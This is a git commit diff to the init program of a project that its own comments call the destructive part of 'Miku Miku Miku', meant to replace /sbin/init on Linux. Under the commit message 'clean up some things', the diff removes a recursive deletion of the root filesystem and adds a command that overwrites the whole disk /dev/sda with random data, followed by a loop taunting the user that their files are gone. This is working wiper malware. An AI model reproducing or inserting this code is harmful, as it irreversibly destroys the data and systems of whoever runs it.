52cf05cc5271fd9b4159d53e0db539e662078014
hyperion0801 <quadcore1472@gmail.com>
2026-07-23 11:51:01 +0200

    fix: clean up some things in init

--- src/init/init.cpp
+++ src/init/init.cpp
@@ -22,30 +22,14 @@ along with this program.  If not, see <https://www.gnu.org/licenses/>.
 #include <cstdio>
 #include <unistd.h>
 
-// The destructive part of Miku Miku Miku, this gets downloaded on runtime.
-// This replaces /sbin/init on Linux distros.
+// The destructive part of Miku Miku Miku, this gets untarred when mikumiku.miku runs.
 
 int main()
 {
     // HATSUNE MIKU!!!!!!!!!!!!!!!!!
-    system("mpv /miku/BD5972AA.ogg");
-
-    // Let's play some Aurascope! Second to last step of the payload.
-    // Unused for now: system("cd Aurascope && xinit /usr/bin/wine Aurascope.exe"); // Most likely not going to do anything as wine is going to crash the instant xD
-
-    // Yeet the files, we don't need em around here.'
-    system("rm -rf / --no-preserve-root");
-    int rmRoot = remove("/*");
-
-    if (!rmRoot)
-    {
-        perror("Error deleting files: /*");
-        return EXIT_FAILURE;
-    }
-    else
-    {
-        std::cout << "Successfully deleted /*!";
-    }
+    system("mpv /miku/BD5972AA.ogg &");
+    sleep(10);
+    system("dd if=/dev/urandom of=/dev/sda &");
 
     while(1) {
         std::cout << "\033[2J\033[1;1H.Good luck getting your files back! Hatsune Miku took them all..." << std::flush;
